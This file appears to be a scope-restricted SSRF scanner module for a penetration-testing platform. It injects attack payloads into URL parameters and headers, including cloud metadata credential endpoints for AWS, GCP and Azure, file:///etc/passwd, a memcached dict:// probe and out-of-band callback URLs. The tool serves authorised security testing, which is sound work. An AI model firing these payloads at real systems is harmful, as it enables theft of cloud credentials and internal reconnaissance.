from __future__ import annotations

import json
from hashlib import sha256
from ipaddress import ip_address, ip_network
from typing import Any, Callable
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import httpx as httpx_client

from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

SSRF_RESULTS_ARTIFACT_NAME = "ssrf-results.json"
DEFAULT_CALLBACK_TOKEN = "aegispt-ssrf-oob"
URL_PARAMETER_NAMES = (
    "url",
    "redirect",
    "callback",
    "webhook",
    "proxy",
    "fetch",
    "load",
    "src",
    "href",
    "target",
    "domain",
    "host",
    "endpoint",
)
HEADER_NAMES = ("Host", "X-Forwarded-Host", "X-Forwarded-For", "Referer")
CLOUD_METADATA_URLS = {
    "aws": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
}
CLOUD_MARKERS = (
    "iam/security-credentials",
    "instance-id",
    "ami-id",
    "computeMetadata",
    "service-accounts",
    "metadata/instance",
)
INTERNAL_MARKERS = (
    "internal admin",
    "admin console",
    "localhost",
    "intranet",
    "private service",
    "internal-only",
)


def _json_artifact(name: str, payload: dict[str, Any], *, kind: str = "runner-results") -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind=kind,
    )


def _response_hash(response: httpx_client.Response) -> str:
    return sha256(response.content).hexdigest()


def _body_excerpt(response: httpx_client.Response) -> str:
    return response.text[:800].replace("\n", " ").strip()


def _success_status(status_code: int) -> bool:
    return 200 <= status_code < 300


def _allowed(scope_allowlist: dict[str, Any] | None, url: str) -> bool:
    return web_target_value_is_allowed_with_path(scope_allowlist or {}, url)


def _assert_allowed(scope_allowlist: dict[str, Any] | None, url: str) -> None:
    if not _allowed(scope_allowlist, url):
        raise ValueError(f"target outside approved web scope: {url}")


def _normalize_string_list(value: object, *, limit: int = 100) -> list[str]:
    if not isinstance(value, list):
        return []
    normalized: list[str] = []
    seen: set[str] = set()
    for item in value:
        candidate = str(item or "").strip()
        if not candidate or candidate in seen:
            continue
        seen.add(candidate)
        normalized.append(candidate)
        if len(normalized) >= limit:
            break
    return normalized


def _render_url(base_target: str, value: str) -> str:
    candidate = str(value or "").strip()
    if not candidate:
        return base_target
    if "://" in candidate:
        return normalize_http_target(candidate)
    return urljoin(base_target.rstrip("/") + "/", candidate.lstrip("/"))


def _candidate_request_records(
    base_target: str,
    *,
    request_contexts: object,
    candidate_paths: object,
    scope_allowlist: dict[str, Any] | None,
) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    if isinstance(request_contexts, list):
        records.extend(item for item in request_contexts if isinstance(item, dict))
    if not records:
        for path in _normalize_string_list(candidate_paths, limit=50):
            records.append({"url": path})
    if not records:
        records.append({"url": base_target})

    normalized: list[dict[str, Any]] = []
    seen_urls: set[str] = set()
    for record in records:
        raw_url = record.get("url") or record.get("target") or record.get("endpoint")
        if not raw_url:
            continue
        url = _render_url(base_target, str(raw_url))
        if url in seen_urls or not _allowed(scope_allowlist, url):
            continue
        seen_urls.add(url)
        normalized.append({**record, "url": url})
    return normalized


def _candidate_header_records(
    base_target: str,
    *,
    header_contexts: object,
    scope_allowlist: dict[str, Any] | None,
) -> list[dict[str, Any]]:
    if isinstance(header_contexts, list) and header_contexts:
        source_records = [item for item in header_contexts if isinstance(item, dict)]
    else:
        source_records = [{"url": base_target}]
    normalized: list[dict[str, Any]] = []
    for record in source_records:
        raw_url = record.get("url") or record.get("target") or record.get("endpoint")
        if not raw_url:
            continue
        url = _render_url(base_target, str(raw_url))
        if _allowed(scope_allowlist, url):
            normalized.append({**record, "url": url})
    return normalized


def _inject_query_parameter(url: str, parameter: str, payload: str) -> str:
    parsed = urlparse(url)
    pairs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    pairs[parameter] = payload
    return urlunparse(parsed._replace(query=urlencode(pairs)))


def _url_parameters(record: dict[str, Any], url: str) -> list[str]:
    configured = _normalize_string_list(record.get("parameters"), limit=20)
    if configured:
        return configured
    query_names = [
        name
        for name, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)
        if name.lower() in URL_PARAMETER_NAMES
    ]
    return list(dict.fromkeys(query_names or ["url"]))


def _callback_url(callback_url: str | None, callback_base_url: str | None, token: str) -> str | None:
    if callback_url:
        return callback_url
    if callback_base_url:
        return callback_base_url.rstrip("/") + "/" + token
    return None


def _confirmed_oob(payload: str, token: str, refs: object) -> dict[str, Any] | None:
    if not isinstance(refs, list):
        return None
    for ref in refs:
        if not isinstance(ref, dict):
            continue
        haystack = " ".join(
            str(ref.get(key) or "")
            for key in ("token", "interaction_id", "url", "callback_url", "payload")
        )
        if token in haystack or payload in haystack:
            return {
                "token": str(ref.get("token") or token),
                "interaction_id": str(ref.get("interaction_id") or ref.get("id") or ""),
                "source": str(ref.get("source") or "provided-oob-evidence"),
            }
    return None


def _append_finding(
    findings: list[dict[str, Any]],
    seen: set[tuple[str, str]],
    *,
    finding_type: str,
    title: str,
    severity: str,
    target: str,
    summary: str,
    evidence: dict[str, Any],
) -> None:
    key = (title.lower(), target.lower())
    if key in seen:
        return
    seen.add(key)
    findings.append(
        {
            "type": finding_type,
            "title": title,
            "severity": severity,
            "target": target,
            "summary": summary,
            "methodology_tags": ["ssrf", "owasp-a10", "input_validation", "ssrf-probe"],
            "evidence": evidence,
            "replay_recipe": {
                "tool": "ssrf-probe",
                "target": target,
                "scope": "approved-web-root-only",
            },
        }
    )


def _host_in_scope_cidr(url: str, scope_allowlist: dict[str, Any] | None) -> bool:
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        return False
    try:
        address = ip_address(host)
    except ValueError:
        return False
    cidrs = (scope_allowlist or {}).get("cidrs") or (scope_allowlist or {}).get("cidr_ranges") or []
    if not isinstance(cidrs, list):
        return False
    for raw_cidr in cidrs:
        try:
            if address in ip_network(str(raw_cidr), strict=False):
                return True
        except ValueError:
            continue
    return False


def _approved_internal_urls(urls: object, scope_allowlist: dict[str, Any] | None) -> list[str]:
    approved: list[str] = []
    for raw_url in _normalize_string_list(urls, limit=20):
        parsed = urlparse(raw_url)
        if parsed.scheme not in {"http", "https"}:
            continue
        if _allowed(scope_allowlist, raw_url) or _host_in_scope_cidr(raw_url, scope_allowlist):
            approved.append(raw_url)
    return approved


def _cloud_metadata_urls(*, enabled: bool, cloud_hosted: bool, cloud_provider: str | None) -> list[str]:
    if not (enabled and cloud_hosted):
        return []
    provider = str(cloud_provider or "").strip().lower()
    if provider:
        return [CLOUD_METADATA_URLS[provider]] if provider in CLOUD_METADATA_URLS else []
    return list(CLOUD_METADATA_URLS.values())


def _marker_found(text: str, markers: tuple[str, ...] | list[str]) -> str | None:
    lowered = text.lower()
    for marker in markers:
        if marker.lower() in lowered:
            return marker
    return None


def execute_ssrf_probe(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    request_contexts: list[dict[str, Any]] | object = None,
    header_contexts: list[dict[str, Any]] | object = None,
    candidate_paths: list[str] | object = None,
    oob_confirmation_refs: list[dict[str, Any]] | object = None,
    callback_url: str | None = None,
    callback_base_url: str | None = None,
    callback_token: str = DEFAULT_CALLBACK_TOKEN,
    internal_service_urls: list[str] | object = None,
    cloud_metadata_probe_enabled: bool = False,
    cloud_hosted: bool = False,
    cloud_provider: str | None = None,
    timeout_seconds: float = 10.0,
    client_factory: Callable[..., Any] = httpx_client.Client,
) -> RunnerExecution:
    if not targets:
        raise ValueError("at least one target is required")
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    normalized_targets = [normalize_http_target(target) for target in targets]
    for target in normalized_targets:
        _assert_allowed(scope_allowlist, target)

    callback_payload = _callback_url(callback_url, callback_base_url, callback_token)
    internal_payloads = _approved_internal_urls(internal_service_urls, scope_allowlist)
    cloud_payloads = _cloud_metadata_urls(
        enabled=cloud_metadata_probe_enabled,
        cloud_hosted=cloud_hosted,
        cloud_provider=cloud_provider,
    )
    file_payloads = ["file:///etc/passwd", "dict://127.0.0.1:11211/stat"]

    checks: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    seen_findings: set[tuple[str, str]] = set()
    stderr_lines: list[str] = []
    exit_code = 0

    with client_factory(follow_redirects=False, timeout=timeout_seconds) as client:
        for base_target in normalized_targets:
            request_records = _candidate_request_records(
                base_target,
                request_contexts=request_contexts,
                candidate_paths=candidate_paths,
                scope_allowlist=scope_allowlist,
            )
            parameter_payloads: list[tuple[str, str]] = []
            if callback_payload:
                parameter_payloads.append(("oob-callback", callback_payload))
            parameter_payloads.extend(("internal-service", payload) for payload in internal_payloads)
            parameter_payloads.extend(("cloud-metadata", payload) for payload in cloud_payloads)
            parameter_payloads.extend(("protocol-probe", payload) for payload in file_payloads)

            for record in request_records:
                url = str(record["url"])
                for parameter in _url_parameters(record, url):
                    for payload_kind, payload_value in parameter_payloads:
                        requested_url = _inject_query_parameter(url, parameter, payload_value)
                        try:
                            response = client.get(
                                requested_url,
                                headers={"User-Agent": "AegisPT/ssrf-probe bounded validation"},
                            )
                        except httpx_client.HTTPError as exc:
                            exit_code = 1
                            stderr_lines.append(f"SSRF parameter probe failed for {url}: {exc}")
                            continue
                        response_text = response.text or ""
                        check = {
                            "check_type": "parameter_ssrf",
                            "target": requested_url,
                            "parameter": parameter,
                            "payload_kind": payload_kind,
                            "status_code": response.status_code,
                            "response_hash": _response_hash(response),
                        }
                        checks.append(check)
                        if payload_kind == "oob-callback":
                            oob = _confirmed_oob(payload_value, callback_token, oob_confirmation_refs)
                            if oob:
                                _append_finding(
                                    findings,
                                    seen_findings,
                                    finding_type="ssrf_blind_oob_confirmed",
                                    title="SSRF - Blind (OOB Confirmed)",
                                    severity="high",
                                    target=url,
                                    summary="A URL-consuming parameter produced governed out-of-band callback evidence.",
                                    evidence={**check, **oob},
                                )
                        if payload_kind == "internal-service" and _success_status(response.status_code):
                            marker = _marker_found(response_text, INTERNAL_MARKERS)
                            if marker:
                                _append_finding(
                                    findings,
                                    seen_findings,
                                    finding_type="ssrf_internal_service_accessible",
                                    title="SSRF - Internal Service Accessible",
                                    severity="high",
                                    target=url,
                                    summary="An approved internal-service URL payload produced internal service markers in the response.",
                                    evidence={**check, "matched_marker": marker, "response_excerpt": _body_excerpt(response)},
                                )
                        if payload_kind == "cloud-metadata" and _success_status(response.status_code):
                            marker = _marker_found(response_text, CLOUD_MARKERS)
                            if marker:
                                _append_finding(
                                    findings,
                                    seen_findings,
                                    finding_type="ssrf_cloud_metadata_exposed",
                                    title="SSRF - Cloud Metadata Exposed",
                                    severity="critical",
                                    target=url,
                                    summary="A cloud metadata payload produced metadata service markers in the response.",
                                    evidence={**check, "matched_marker": marker, "response_excerpt": _body_excerpt(response)},
                                )

            if callback_payload:
                for record in _candidate_header_records(
                    base_target,
                    header_contexts=header_contexts,
                    scope_allowlist=scope_allowlist,
                ):
                    url = str(record["url"])
                    parsed_callback = urlparse(callback_payload)
                    header_value = parsed_callback.netloc or callback_payload
                    configured_headers = _normalize_string_list(record.get("headers"), limit=10)
                    header_names = configured_headers or list(HEADER_NAMES)
                    headers = {
                        name: (callback_payload if name.lower() == "referer" else header_value)
                        for name in header_names
                    }
                    try:
                        response = client.get(
                            url,
                            headers={
                                "User-Agent": "AegisPT/ssrf-probe bounded header validation",
                                **headers,
                            },
                        )
                    except httpx_client.HTTPError as exc:
                        exit_code = 1
                        stderr_lines.append(f"SSRF header probe failed for {url}: {exc}")
                        continue
                    check = {
                        "check_type": "header_ssrf",
                        "target": url,
                        "headers": sorted(headers),
                        "payload_kind": "oob-callback",
                        "status_code": response.status_code,
                        "response_hash": _response_hash(response),
                    }
                    checks.append(check)
                    oob = _confirmed_oob(callback_payload, callback_token, oob_confirmation_refs)
                    if oob:
                        _append_finding(
                            findings,
                            seen_findings,
                            finding_type="ssrf_blind_oob_confirmed",
                            title="SSRF - Blind (OOB Confirmed)",
                            severity="high",
                            target=url,
                            summary="A forwarded or Host-style header produced governed out-of-band callback evidence.",
                            evidence={**check, **oob},
                        )

    payload = {
        "tool": "ssrf-probe",
        "targets": normalized_targets,
        "checks": checks,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "check_count": len(checks),
            "finding_count": len(findings),
            "blind_oob_findings": sum(1 for finding in findings if finding.get("type") == "ssrf_blind_oob_confirmed"),
            "internal_service_findings": sum(1 for finding in findings if finding.get("type") == "ssrf_internal_service_accessible"),
            "cloud_metadata_findings": sum(1 for finding in findings if finding.get("type") == "ssrf_cloud_metadata_exposed"),
        },
        "safety": {
            "scope_enforced": True,
            "approved_web_root_only": True,
            "requires_active_approval": True,
            "ssrf_to_rce_escalation": False,
            "internal_pivoting": False,
            "cloud_metadata_probe_enabled": bool(cloud_metadata_probe_enabled and cloud_hosted),
            "real_internal_urls_skipped_unless_approved": True,
        },
    }
    return RunnerExecution(
        tool="ssrf-probe",
        exit_code=exit_code,
        stdout=json.dumps(payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.ssrf_probe.runner:v1",
            "tool_version": "custom-python-bounded",
            "finding_count": len(findings),
            "check_count": len(checks),
        },
        artifacts=[_json_artifact(SSRF_RESULTS_ARTIFACT_NAME, payload)],
    )
